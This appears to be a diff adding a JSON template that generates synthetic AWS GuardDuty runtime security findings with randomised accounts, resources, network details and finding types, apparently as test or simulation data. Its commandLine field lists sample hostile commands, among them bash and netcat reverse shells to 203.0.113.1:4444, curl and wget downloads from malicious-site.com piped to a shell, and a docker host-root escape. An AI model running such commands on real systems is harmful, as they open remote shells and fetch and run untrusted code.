@@ -1,0 +1,290 @@
+{
+  "version": "0",
+  "id": "{{ random_guid() }}",
+  "detail-type": "GuardDuty Finding",
+  "source": "aws.guardduty",
+  "account": "{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}",
+  "time": "{{ now() | iso8601 }}",
+  "region": "{{ random_choice(['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'eu-west-1', 'eu-central-1', 'ap-southeast-1', 'ap-northeast-1']) }}",
+  "resources": [],
+  "detail": {
+    "schemaVersion": "2.0",
+    "accountId": "{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}",
+    "region": "{{ random_choice(['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'eu-west-1', 'eu-central-1']) }}",
+    "partition": "aws",
+    "id": "{{ random_hex(32, 32) }}",
+    "arn": "arn:aws:guardduty:{{ random_choice(['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2']) }}:{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}:detector/{{ random_string(12) }}/finding/{{ random_hex(32, 32) }}",
+    "type": "{{ random_choice([
+      'CryptoCurrency:Runtime/BitcoinTool.B',
+      'Backdoor:Runtime/C&CActivity.B',
+      'UnauthorizedAccess:Runtime/TorRelay',
+      'UnauthorizedAccess:Runtime/TorClient',
+      'Trojan:Runtime/BlackholeTraffic',
+      'Trojan:Runtime/DropPoint',
+      'CryptoCurrency:Runtime/BitcoinTool.B!DNS',
+      'Backdoor:Runtime/C&CActivity.B!DNS',
+      'Trojan:Runtime/BlackholeTraffic!DNS',
+      'Trojan:Runtime/DropPoint!DNS',
+      'Trojan:Runtime/DGADomainRequest.C!DNS',
+      'Trojan:Runtime/DriveBySourceTraffic!DNS',
+      'Trojan:Runtime/PhishingDomainRequest!DNS',
+      'Impact:Runtime/AbusedDomainRequest.Reputation',
+      'Impact:Runtime/BitcoinDomainRequest.Reputation',
+      'Impact:Runtime/MaliciousDomainRequest.Reputation',
+      'Impact:Runtime/SuspiciousDomainRequest.Reputation',
+      'UnauthorizedAccess:Runtime/MetadataDNSRebind',
+      'Execution:Runtime/NewBinaryExecuted',
+      'PrivilegeEscalation:Runtime/DockerSocketAccessed',
+      'PrivilegeEscalation:Runtime/RuncContainerEscape',
+      'PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified',
+      'DefenseEvasion:Runtime/ProcessInjection.Proc',
+      'DefenseEvasion:Runtime/ProcessInjection.Ptrace',
+      'DefenseEvasion:Runtime/ProcessInjection.VirtualMemoryWrite',
+      'Execution:Runtime/ReverseShell',
+      'DefenseEvasion:Runtime/FilelessExecution',
+      'Impact:Runtime/CryptoMinerExecuted',
+      'Execution:Runtime/NewLibraryLoaded',
+      'PrivilegeEscalation:Runtime/ContainerMountsHostDirectory',
+      'PrivilegeEscalation:Runtime/UserfaultfdUsage',
+      'Execution:Runtime/SuspiciousTool',
+      'Execution:Runtime/SuspiciousCommand',
+      'DefenseEvasion:Runtime/SuspiciousCommand',
+      'DefenseEvasion:Runtime/PtraceAntiDebugging',
+      'Execution:Runtime/MaliciousFileExecuted',
+      'Execution:Runtime/SuspiciousShellCreated',
+      'PrivilegeEscalation:Runtime/ElevationToRoot',
+      'Discovery:Runtime/SuspiciousCommand',
+      'Persistence:Runtime/SuspiciousCommand',
+      'PrivilegeEscalation:Runtime/SuspiciousCommand',
+      'DefenseEvasion:Runtime/KernelModuleLoaded'
+    ]) }}",
+    "resource": {
+      "resourceType": "{{ random_choice(['Instance', 'EKSCluster', 'ECSTask', 'Container']) }}",
+      "instanceDetails": {
+        "instanceId": "i-{{ random_hex(17, 17) }}",
+        "instanceType": "{{ random_choice(['t2.micro', 't2.small', 't2.medium', 't3.micro', 't3.small', 't3.medium', 'm5.large', 'm5.xlarge', 'c5.large', 'c5.xlarge']) }}",
+        "launchTime": {{ (now() | unix_timestamp) - random_int(3600, 2592000) }}000,
+        "networkInterfaces": [{
+          "ipv6Addresses": [],
+          "privateDnsName": "ip-{{ random_private_ip() | replace('.', '-') }}.{{ random_choice(['us-east-1', 'us-west-2']) }}.compute.internal",
+          "privateIpAddress": "{{ random_private_ip() }}",
+          "subnetId": "subnet-{{ random_hex(8, 8) }}",
+          "vpcId": "vpc-{{ random_hex(8, 8) }}",
+          "publicDnsName": "ec2-{{ random_public_ip() | replace('.', '-') }}.{{ random_choice(['us-east-1', 'us-west-2']) }}.compute.amazonaws.com",
+          "publicIp": "{{ random_public_ip() }}"
+        }],
+        "imageId": "ami-{{ random_hex(8, 8) }}",
+        "imageDescription": "{{ random_choice(['Amazon Linux 2023', 'Amazon Linux 2', 'Ubuntu Server 22.04 LTS', 'Ubuntu Server 20.04 LTS']) }}",
+        "platform": "{{ random_choice(['LINUX_UNIX', 'WINDOWS']) }}",
+        "productCodes": [],
+        "iamInstanceProfile": {
+          "arn": "arn:aws:iam::{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}:instance-profile/{{ random_string(16) }}",
+          "id": "{{ random_string(21) }}"
+        }
+      },
+      "eksClusterDetails": {
+        "name": "{{ random_choice(['production-cluster', 'staging-cluster', 'development-cluster']) }}-{{ random_int(1000, 9999) }}",
+        "arn": "arn:aws:eks:{{ random_choice(['us-east-1', 'us-east-2']) }}:{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}:cluster/{{ random_choice(['production-cluster', 'staging-cluster']) }}-{{ random_int(1000, 9999) }}",
+        "vpcId": "vpc-{{ random_hex(8, 8) }}",
+        "subnetIds": [
+          "subnet-{{ random_hex(8, 8) }}",
+          "subnet-{{ random_hex(8, 8) }}"
+        ],
+        "tags": [
+          {
+            "key": "Environment",
+            "value": "{{ random_choice(['Production', 'Staging', 'Development']) }}"
+          }
+        ],
+        "kubernetesVersion": "{{ random_choice(['1.28', '1.27', '1.26']) }}"
+      },
+      "ecsClusterDetails": {
+        "name": "{{ random_choice(['production-cluster', 'staging-cluster', 'development-cluster']) }}-{{ random_int(1000, 9999) }}",
+        "arn": "arn:aws:ecs:{{ random_choice(['us-east-1', 'us-east-2']) }}:{{ registry.get_organization_field('aws_account_id') | default('123456789012', true) }}:cluster/{{ random_choice(['production-cluster', 'staging-cluster']) }}-{{ random_int(1000, 9999) }}"
+      },
+      "containerDetails": {
+        "containerRuntime": "{{ random_choice(['docker', 'containerd', 'cri-o']) }}",
+        "id": "{{ random_string(64, 'abcdef0123456789') }}",
+        "name": "{{ random_choice(['web-server', 'api-service', 'database-proxy', 'cache-service']) }}-{{ random_int(100, 999) }}",
+        "image": "{{ random_choice(['nginx:latest', 'redis:alpine', 'postgres:15', 'node:18']) }}",
+        "imagePrefix": "{{ random_choice(['docker.io/library', '123456789012.dkr.ecr.us-east-1.amazonaws.com']) }}",
+        "volumeMounts": [
+          {
+            "name": "{{ random_choice(['config', 'data', 'cache']) }}",
+            "mountPath": "/{{ random_choice(['etc', 'var', 'tmp']) }}/{{ random_choice(['config', 'data', 'cache']) }}"
+          }
+        ],
+        "securityContext": {
+          "privileged": {{ random_choice(['true', 'false']) }},
+          "allowPrivilegeEscalation": {{ random_choice(['true', 'false']) }}
+        }
+      }
+    },
+    "service": {
+      "serviceName": "guardduty",
+      "detectorId": "{{ random_hex(32, 32) }}",
+      "action": {
+        "actionType": "{{ random_choice(['NETWORK_CONNECTION', 'DNS_REQUEST', 'FILE_ACTIVITY', 'PROCESS_LAUNCH', 'RUNTIME_ACTIVITY']) }}",
+        "networkConnectionAction": {
+          "connectionDirection": "{{ random_choice(['OUTBOUND', 'INBOUND']) }}",
+          "remoteIpDetails": {
+            "ipAddressV4": "{{ random_public_ip() }}",
+            "organization": {
+              "asn": {{ random_int(1, 65535) }},
+              "asnOrg": "{{ random_choice(['AS-AMAZON', 'AS-GOOGLE', 'AS-TOR', 'AS-UNKNOWN']) }}",
+              "isp": "{{ random_choice(['Amazon Technologies Inc.', 'Google LLC', 'Tor Network', 'Unknown ISP']) }}",
+              "org": "{{ random_choice(['Amazon', 'Google Cloud', 'Tor Exit Node', 'Unknown']) }}"
+            },
+            "country": {
+              "countryName": "{{ random_choice(['United States', 'China', 'Russia', 'Germany']) }}"
+            },
+            "city": {
+              "cityName": "{{ random_choice(['Unknown', 'Beijing', 'Moscow', 'Frankfurt']) }}"
+            },
+            "geoLocation": {
+              "lat": {{ random_int(-90, 90) }},
+              "lon": {{ random_int(-180, 180) }}
+            }
+          },
+          "remotePortDetails": {
+            "port": {{ random_choice([80, 443, 8333, 8332, 4444, 8080, 9999]) }},
+            "portName": "{{ random_choice(['HTTP', 'HTTPS', 'Bitcoin', 'Bitcoin-RPC', 'Unknown']) }}"
+          },
+          "localPortDetails": {
+            "port": {{ random_port(1024, 65535) }},
+            "portName": "Unknown"
+          },
+          "protocol": "{{ random_choice(['TCP', 'UDP']) }}",
+          "blocked": {{ random_choice(['true', 'false']) }}
+        },
+        "dnsRequestAction": {
+          "domain": "{{ random_choice(['guarddutyc2activityb.com', 'bitcoin-pool.com', 'crypto-mine.xyz', 'malicious-domain.ru', 'dga-generated-12345.com', 'phishing-site.info', 'tor-relay-node.onion', '169.254.169.254']) }}",
+          "protocol": "{{ random_choice(['UDP', 'TCP']) }}",
+          "blocked": {{ random_choice(['true', 'false']) }}
+        }
+      },
+      "runtimeDetails": {
+        "process": {
+          "name": "{{ random_choice(['/usr/bin/python3', '/bin/bash', '/usr/sbin/sshd', '/usr/bin/curl', '/usr/bin/wget', '/bin/sh', '/usr/bin/nc', '/usr/bin/ncat', '/usr/bin/systemd', '/usr/sbin/dockerd', '/usr/bin/docker', '/usr/bin/kubectl', '/usr/bin/runc', '/bin/mount', '/usr/bin/setuid']) }}",
+          "pid": {{ random_int(1, 65535) }},
+          "ppid": {{ random_int(1, 1000) }},
+          "startTime": {{ (now() | unix_timestamp) - random_int(0, 3600) }},
+          "namespacePid": {{ random_int(1, 65535) }},
+          "user": "{{ random_choice(['root', 'www-data', 'nginx', 'postgres', 'ec2-user', 'ubuntu']) }}",
+          "userId": {{ random_choice([0, 33, 100, 501, 1000, 1001]) }},
+          "euid": {{ random_choice([0, 33, 100, 1000]) }},
+          "parentName": "{{ random_choice(['/usr/sbin/sshd', '/usr/bin/systemd', '/bin/bash', '/usr/bin/dockerd', '/usr/bin/containerd', '/bin/sh']) }}",
+          "executablePath": {
+            "text": "{{ random_choice(['/usr/bin/python3', '/bin/bash', '/usr/bin/curl', '/usr/bin/wget', '/usr/bin/nc', '/usr/bin/docker', '/usr/bin/kubectl']) }}"
+          },
+          "executableSha256": "{{ random_string(64, 'abcdef0123456789') }}",
+          "workingDirectory": {
+            "text": "{{ random_choice(['/tmp', '/var/tmp', '/home/ubuntu', '/root', '/opt', '/usr/local/bin']) }}"
+          },
+          "commandLine": {
+            "text": "{{ random_choice(['python3 -c \"import socket; s=socket.socket(); s.connect((\\\"203.0.113.1\\\", 4444))\"', 'bash -i >& /dev/tcp/203.0.113.1/4444 0>&1', 'curl http://malicious-site.com/payload.sh | bash', 'wget -O- http://malicious-site.com/payload.sh | sh', 'nc -e /bin/bash 203.0.113.1 4444', 'docker run -v /:/host alpine chroot /host bash', 'kubectl exec -it pod-name -- /bin/bash', 'mount /dev/sda1 /mnt', 'setuid /bin/bash']) }}"
+          }
+        },
+        "context": {
+          "additionalEvidence": {
+            "threatIntelligenceDetails": [
+              {
+                "threatListName": "{{ random_choice(['ProofPoint', 'Custom Threat List', 'AWS Threat Intelligence', 'Amazon']) }}",
+                "threatNames": [
+                  "{{ random_choice(['C&C Server', 'Bitcoin Mining', 'Tor Network', 'Malicious Domain', 'Log4j Related']) }}"
+                ]
+              }
+            ]
+          },
+          "requestId": "{{ random_guid() }}",
+          "runtimeContext": {
+            "addressSpaceFlags": {
+              "isShared": {{ random_choice(['true', 'false']) }},
+              "isStack": {{ random_choice(['true', 'false']) }},
+              "isMapped": {{ random_choice(['true', 'false']) }}
+            },
+            "memoryRegions": [
+              {
+                "regionBaseAddress": "0x{{ random_hex(8, 8) }}",
+                "regionSize": {{ random_int(4096, 1048576) }},
+                "regionProtection": "{{ random_choice(['RWX', 'RW-', 'R-X', 'R--']) }}"
+              }
+            ],
+            "modifiedAt": {{ (now() | unix_timestamp) - random_int(0, 3600) }},
+            "toolName": "{{ random_choice(['curl', 'wget', 'nc', 'ncat', 'socat', 'netcat']) }}",
+            "toolCategory": "{{ random_choice(['NETWORK', 'EXECUTION', 'DISCOVERY']) }}"
+          }
+        },
+        "effectiveUser": {
+          "uid": {{ random_choice([0, 33, 100, 1000]) }},
+          "gid": {{ random_choice([0, 33, 100, 1000]) }},
+          "username": "{{ random_choice(['root', 'www-data', 'nginx', 'postgres', 'ec2-user']) }}"
+        }
+      },
+      "resourceRole": "TARGET",
+      "eventFirstSeen": "{{ (now() | subtract_seconds(random_int(0, 3600))) | iso8601 }}",
+      "eventLastSeen": "{{ now() | iso8601 }}",
+      "archived": false,
+      "count": {{ random_int(1, 100) }},
+      "additionalInfo": {
+        "threatListName": "{{ random_choice(['ProofPoint', 'Custom Threat List', 'AWS Threat Intelligence', 'Amazon', 'Community Threat List']) }}",
+        "threatName": "{{ random_choice(['C&C Server', 'Bitcoin Mining', 'Tor Network', 'Phishing Domain', 'DGA Domain', 'Log4j Related', 'Malicious Binary', 'Container Escape']) }}",
+        "sample": false
+      }
+    },
+    "severity": {{ random_choice([2, 2, 5, 5, 5, 8, 8, 8]) }},
+    "createdAt": "{{ (now() | subtract_seconds(random_int(0, 7200))) | iso8601 }}",
+    "updatedAt": "{{ now() | iso8601 }}",
+    "title": "{{ random_choice([
+      'Cryptocurrency-related activity detected on instance or container',
+      'Command and control server communication detected',
+      'Tor relay activity detected on instance or container',
+      'Tor client activity detected on instance or container',
+      'Blackhole traffic pattern detected',
+      'DropPoint trojan activity detected',
+      'New binary execution detected',
+      'Docker socket accessed for privilege escalation',
+      'Container escape attempt via runc detected',
+      'CGroups release agent modified',
+      'Process injection attempt detected',
+      'Reverse shell connection detected',
+      'Fileless execution detected',
+      'Cryptocurrency miner executed',
+      'New library loaded into process',
+      'Container mounting host directory detected',
+      'Suspicious tool execution detected',
+      'Suspicious command execution detected',
+      'Ptrace anti-debugging detected',
+      'Malicious file execution detected',
+      'Suspicious shell creation from network service',
+      'Privilege escalation to root detected',
+      'Kernel module loaded on instance'
+    ]) }}",
+    "description": "{{ random_choice([
+      'GuardDuty detected cryptocurrency-related activity on your EC2 instance or container. A process running on the listed resource is querying an IP address associated with cryptocurrency-related activity.',
+      'GuardDuty detected command and control server communication. A process running on the listed EC2 instance or container is querying an IP address associated with a known command and control server.',
+      'GuardDuty detected Tor relay activity. A process running on the listed EC2 instance or container is making connections to a Tor network in a manner that suggests it is acting as a Tor relay.',
+      'GuardDuty detected Tor client activity. A process running on the listed EC2 instance or container is making connections to a Tor Guard or Authority node.',
+      'GuardDuty detected a blackhole traffic pattern. This indicates potential malicious network behavior.',
+      'GuardDuty detected DropPoint trojan activity on your instance or container.',
+      'GuardDuty detected a new binary execution on your EC2 instance or container. A previously unseen executable file has been executed.',
+      'GuardDuty detected Docker socket access. A process accessed the Docker socket which could indicate privilege escalation attempts.',
+      'GuardDuty detected a container escape attempt via runc. This indicates an attempt to escape container isolation.',
+      'GuardDuty detected CGroups release agent modification. This could indicate a container escape attempt.',
+      'GuardDuty detected a process injection attempt. An attempt was made to inject code into another process.',
+      'GuardDuty detected a reverse shell connection. A process on the listed resource initiated a reverse shell connection.',
+      'GuardDuty detected fileless execution. Code execution occurred without writing files to disk, indicating advanced evasion techniques.',
+      'GuardDuty detected cryptocurrency miner execution. A cryptocurrency mining program was executed on your instance or container.',
+      'GuardDuty detected a new library loaded into a process. A previously unseen library was loaded, which could indicate malicious activity.',
+      'GuardDuty detected a container mounting a host directory. This could indicate a privilege escalation or data access attempt.',
+      'GuardDuty detected suspicious tool execution. A potentially malicious tool was executed on your instance or container.',
+      'GuardDuty detected suspicious command execution. A command that may provide an attacker with information or perform malicious actions was executed.',
+      'GuardDuty detected ptrace anti-debugging. An attempt was made to evade debugging using ptrace.',
+      'GuardDuty detected malicious file execution. A known malicious executable has been executed on your EC2 instance or container.',
+      'GuardDuty detected suspicious shell creation. A network-accessible service has launched an interactive shell process.',
+      'GuardDuty detected privilege escalation to root. A process has assumed root privileges through unusual or suspicious setuid binary execution.',
+      'GuardDuty detected kernel module loading. A kernel module was loaded on your EC2 instance, indicating an attempt to gain kernel-level access.'
+    ]) }}"
+  }
+}
+
